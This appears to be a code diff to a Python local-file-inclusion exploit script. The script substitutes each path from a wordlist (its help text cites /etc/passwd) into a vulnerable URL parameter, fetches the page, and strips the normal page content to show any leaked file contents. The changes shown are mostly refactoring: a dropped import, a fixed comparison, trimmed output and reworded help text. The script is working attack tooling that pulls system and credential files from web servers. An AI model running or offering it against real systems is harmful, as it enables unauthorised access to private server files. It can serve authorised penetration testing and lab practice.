@@ -1,8 +1,6 @@
 import sys
 from argparse import ArgumentParser
-import requests
 from urllib.request import urlopen
-
 
 def vrfy_args():
     try:
@@ -30,17 +28,17 @@ def exploit_LFI():
         url_var = url.replace('LFI', line)
         page = urlopen(url_var)
         content = page.read()
-        if len(content) is not default_size:
+        if len(content) != default_size:
 
             if default_size is not 0:
                 final_content = clean_output(content.decode("utf-8"),default_page.decode("utf-8"))
             else:
                 final_content = content.decode("utf-8")
             if args.dest == None:
-                print("#########################\nResult for => " + line + "#########################" + final_content + "\n")
+                print("#########################\nResult for => " + line + "#########################" + final_content )
             else:
                 with open(args.dest, 'a') as f:
-                    f.write("#########################\nResult for => " + line + "#########################" + final_content + "\n")
+                    f.write("#########################\nResult for => " + line + "#########################" + final_content)
                     f.close()
 
 
@@ -48,16 +46,22 @@ def clean_output(content,default_page):
     ## function to only keep the LFI result and remove the value that are part of the website
     for line in default_page.splitlines():
         content = content.replace(line, '')
-    return content
+
+    new_content = ""
+    for line in content.splitlines():
+        if not line == "":
+            new_content += line + "\n"
+
+    return new_content
 
 
 if __name__ == '__main__':
     p = ArgumentParser()
     p.add_argument('-w', '--wordlist', dest='list',
-                   help='Wordlist containing files to test with LFI (example: /etc/passwd)', required=True)
-    p.add_argument('-u', '--url', dest='url', help='The path to the LFI exploit example: http://localhost?file=LFI',
+                   help='Path to the wordlist file', required=True)
+    p.add_argument('-u', '--url', dest='url', help='Url of the LFI vulnerable web page http://localhost?file=LFI',
                    required=True)
-    p.add_argument('-o', '--outfile', dest='dest', help='Output file to write all informations found', required=False)
+    p.add_argument('-o', '--outfile', dest='dest', help='Path to the output file, if none the output will be display on the screen', required=False)
     args = p.parse_args()
 
     vrfy_args()
